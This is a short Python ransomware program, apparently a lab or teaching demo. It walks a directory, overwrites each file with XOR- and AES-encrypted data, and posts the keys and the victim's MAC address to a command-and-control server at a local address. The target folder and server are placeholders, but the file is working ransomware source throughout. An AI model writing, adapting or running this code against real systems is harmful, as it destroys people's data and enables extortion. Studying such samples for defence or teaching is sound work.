import requests
import base64
import urllib
import hashlib
import binascii
import getmac
import os
from colored import fg, attr
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random
from Crypto.Random import get_random_bytes

class Ransomware:
	def encrypt(self, file):
		print("{}[+] encrypting -> {}{}".format(fg(9), file, attr(0)))
		fd = open(file, "rb")
		data = binascii.hexlify(fd.read())
		fd.close()

		xored_data = b""
		i = 0
		while i < len(data):
			xored_data += chr(data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
			i += 1

		cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
		ciphertext = cipher.encrypt(pad(xored_data, AES.block_size))

		fd = open(file, "wb")
		fd.write(ciphertext)
		fd.close()


	def generate_keys(self):
		print("{}[*] generating encryption keys...{}".format(fg(10), attr(0)))
		self.xor_key = binascii.hexlify(Random.new().read(AES.block_size - 8))
		self.enc_key = hashlib.sha256(self.xor_key + Random.new().read(AES.block_size)).digest()
		self.iv = Random.new().read(AES.block_size)
		self.victim_mac_address = getmac.get_mac_address().encode()
		self.save_keys()


	def save_keys(self):
		print("{}[*] saving encryption keys to command and control (C2) server...{}".format(fg(10), attr(0)))
		c2_url = "http://127.0.0.1:1337/save_keys"
		data = {"mac_address": self.encode_keys(self.victim_mac_address), "enc_key": self.encode_keys(self.enc_key), "xor_key": self.encode_keys(self.xor_key), "iv": self.encode_keys(self.iv)}
		response = requests.post(c2_url, data = data)


	def dir_to_encrypt(self, dir_name):
		self.generate_keys()
		print("{}[*] encrypting '{}' directory{}".format(fg(10), dir_name, attr(0)))
		for root, subdirs, files in os.walk(dir_name):
			for file in files:
				self.encrypt("{}/{}".format(root, file))


	def encode_keys(self, key):
		return urllib.parse.quote(base64.b64encode(key))


ransom = Ransomware()
ransom.dir_to_encrypt("/insensitive-files")